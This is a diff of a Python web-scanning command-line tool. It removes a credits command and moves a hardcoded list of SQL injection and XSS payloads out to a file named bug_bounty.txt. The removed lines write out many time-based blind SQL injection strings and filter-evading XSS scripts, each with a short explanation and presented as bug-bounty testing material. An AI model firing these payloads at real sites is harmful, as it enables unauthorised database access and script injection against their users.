@@ -5,7 +5,6 @@ import platform
 import os
 import subprocess
 import time
-from tkinter import messagebox
 import json
 from datetime import datetime
 
@@ -288,126 +287,15 @@ def list_commands():
     print("/history - Shows the command history")
     print("/clearhistory - Clears the command history")
     print("/list - Shows this list of commands")
-    print("/credits - Shows creator name")
     print("/exit - Exit for exit here ")
     print("/quit - Quit for go here")
 
 def hackorbugbounty():
-    print("Part 1.")
-
-    print("'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z")
-    print("Checks if `now()` equals `sysdate()`. If true, it induces a 10-second delay.")
-
-    print("\"XOR(if(now()=sysdate(),sleep(10),0))XOR\"Z")
-    print("Similar string that tries conditional injection based on delay.")
-
-    print("X'XOR(if(now()=sysdate(),//sleep(10)//,0))XOR'X")
-    print("Uses comments (`//`) to attempt evading filters.")
-
-    print("X'XOR(if(now()=sysdate(),(sleep(10)),0))XOR'X")
-    print("Encapsulates `sleep(10)` with parentheses to enforce a delay.")
-
-    print("X'XOR(if((select now()=sysdate()),BENCHMARK(10000000,md5('xyz')),0))XOR'X")
-    print("Uses `BENCHMARK` with `MD5` for performance and brute-force tests.")
-
-    print("'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z")
-    print("Subquery that induces a delay using `SLEEP(10)`.")
-
-    print("(SELECT(0)FROM(SELECT(SLEEP(10)))a)")
-    print("Simplified subquery that includes `SLEEP(10)`.")
-
-    print("'XOR(if(now()=sysdate(),sleep(10),0))OR'")
-    print("Combination of XOR and OR operators for injection.")
-
-    print("1 AND (SELECT(0)FROM(SELECT(SLEEP(10)))a)-- wXyW")
-    print("Combines a logical `AND` with a subquery to cause a delay.")
-
-    print("(SELECT * FROM (SELECT(SLEEP(10)))a)")
-    print("Subquery that delays execution with `SLEEP(10)`.")
-
-    print("'%2b(select*from(select(sleep(10)))a)%2b'")
-    print("URL encoding (`%2b` represents `+`) to evade detection.")
-
-    print("CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(10))END")
-    print("Conditional to delay if the version has a specific length.")
-
-    print("');(SELECT 4564 FROM PG_SLEEP(10))--")
-    print("PostgreSQL payload using `PG_SLEEP(10)` to delay execution.")
-
-    print("DBMS_PIPE.RECEIVE_MESSAGE([INT],10) AND 'bar'='bar")
-    print("Oracle payload using `DBMS_PIPE.RECEIVE_MESSAGE` to induce a delay.")
-
-    print("-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//")
-    print("Evaluates specific conditions on the user and executes code.")
-
-    print("BENCHMARK(10000000,MD5(CHAR(116)))")
-    print("Forces high resource consumption via intensive calculations.")
-
-    print("'%2bbenchmark(10000000,sha1(1))%2b'")
-    print("Tests performance using `BENCHMARK` with URL encoding.")
-
-    print("'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(1)) ELSE '0' END)='1")
-    print("Uses `CASE` and `PG_SLEEP` to delay queries based on PostgreSQL conditions.")
-
-    print("Part 2.")
-
-    print('>alert(154)</script><script/154=’;;;;;;;', "A script that triggers an alert with number 154.")
-    print('<ScriPt>ᨆ="",ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()', "An obfuscated script that executes an `alert` with a dynamically calculated value.")
-    print('<script TEST>alert(1)</script TESTTEST>', "A script attempting to trigger an alert but with an unusual attribute name.")
-    print('<ScriPt 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?', "A script that uses mathematical operations in the tag name.")
-    print('"><script akdk> prompt(document.domain)</script akdk>', "A script that shows the page domain via `prompt`.")
-    print('<script ~~~>alert(0%0)</script ~~~>', "A script with special characters showing an alert.")
-    print('"<script>alert(0)</script>"@gmail.com', "An injection attempt with the script followed by an email address.")
-    print('#/<script>alert(1234)</script>', "Injection in an HTML comment with a script triggering an alert.")
-    print('/script>alert(1234)</script>', "A similar script with an error in the `script` tag opening.")
-    print('<script>alert(1234)</script>', "A simple script showing an alert with value 1234.")
-    print('<ScripT>alert(1234)</ScRipT>', "A variation of the script using uppercase in HTML tags.")
-    print('"><script>alert(123)</script>', "An XSS injection attempt that opens a script tag with an alert.")
-    print('\'"><script>alert(123)</script>', "Another attempt with a quote closure before opening the script.")
-    print('--><script>alert(123)</script>', "An injection attack commented with `--` before executing the script.")
-    print('><script>alert(123)</script>', "Script with an opening tag without a prior attribute.")
-    print('＜script＞alert(123)＜/script＞', "Injection using Chinese characters instead of standard tag symbols.")
-    print('"><script>alert(123);</script x="', "Using strange attributes in the `script` tag.")
-    print('\'><script>alert(123);</script x=\'', "Another attempt using single quotes in the attribute.")
-    print('><script>alert(123);</script x=', "Using a `script` tag with an incomplete attribute.")
-    print('<script>’alert(1)’.replace(/.+/,eval)</script>', "A script with an alert that uses `replace` to obfuscate the code.")
-    print('"><script>alert(1)</script><', "Injection with premature tag closure.")
-    print('#<script>alert(1)</script>', "HTML comment followed by a script triggering an alert.")
-    print('\'`"//><script>alert(1)</script>', "Injection with multiple quotes and special characters.")
-    print('<!<script>alert(1)</script>', "Using a comment symbol (`<!`) before the `script` tag.")
-    print('<!<script>alert(1)</script> “', "An attempt with double quotes at the end.")
-    print('<%<!--\'%><script>alert(1);</script -->', "Using HTML comments along with the script.")
-    print('<%<script>alert(1)</script>', "Another injection with a `<%` symbol to attempt code insertion.")
-    print('<scr'+'ipt>alert(1)</scr'+'ipt>', "Obfuscation of the `script` tags by splitting their name.")
-    print('<script /**/>/**/alert(1)/**/</script /**/', "A script with additional comments inside the tag.")
-    print('javascript:alert(\'document.cookie\')', "A JavaScript link that shows the document's cookies.")
-    print('<script>/&/-alert(1)</script>', "Another script variant with extra characters.")
-    print('<script>alert(1)</script>', "A simple script showing an alert.")
-    print('<script>alert`1`</script>', "Using a backtick to enclose the value to display.")
-    print('\\<script\\>alert(1)\\<\\/script\\>', "Injection using escaped characters.")
-    print('“><script>alert(1);</script>', "Injection with special quotes ending the HTML attribute.")
-    print('<sCRipT>alert(1)</sCRiPt>', "Another variation of the `script` tag using a mix of uppercase and lowercase letters.")
-    print('<ScRiPt>alert(1)</sCriPt>', "A similar variation with a different combination of uppercase and lowercase letters.")
-    print('#<ScRiPt>alert(1)</ScRiPt>#', "HTML comment with the alert script.")
-    print('<ScRiPt>alert(1)</ScRiPt>', "An attack with the `script` tag name partially changed.")
-    print('<<SCRIPT>alert(1);//<</SCRIPT>', "Injection with multiple opening symbols.")
-    print('*/</script>\'>alert(1)/*<script/1=\'', "Injection with closing comments to try closing the script.")
-    print('<script>alert(1)</script>.asp', "A script followed by an ASP file extension.")
-    print('<script>alert(1)</script>.aspx', "A variant with `.aspx` extension.")
-    print('<script>alert(1)</script>.htm', "Another example with `.htm` extension.")
-    print('<script>alert(1)</script>.html', "Example with `.html` extension.")
-    print('<script>alert(1)</script>.php', "Injection in a `.php` file.")
-    print('\"><script>alert(2);</script>', "A script showing an alert with value 2.")
-    print('\'>  <script>alert(2);</script>', "Another variant with single quotes and an alert.")
-    print('\'>  <script>alert(2);</script>', "Injection with `>` and the alert script.")
-    print('\'>👽💻🔥<script>alert(2);</script>', "An attempt with emojis alongside the alert script.")
-    print('"><script>alert(2);</script>', "Script similar to the previous ones with a different value in the alert.")
-    print('\'>"><script>alert(2);</script>', "Another variant with quote closure before the script.")
-    print('\'>"><script>alert(2);</script>', "An injection showing an alert with value 2.")
-
-def credits():
-    print("Developed by @mrduck123\n")
-
+    bugbounty = "bug_bounty.txt"
+    with open(bugbounty, 'r') as file:
+        content = file.read()
+    print(content)
+    
 def check_for_exposed_databases_in_code_scan_sql_injection_mode4(url):
     try:
         res = requests.get(url, timeout=10)
@@ -467,8 +355,6 @@ def main():
             clear_history()
         elif user_input == '/list':
             list_commands()
-        elif user_input == '/credits':
-            credits()
         elif user_input in ['/1', '/2', '/3', '/4']:
             selected_mode = user_input
             print(f"[+] Mode selected: {selected_mode}. Now enter a valid URL to proceed")
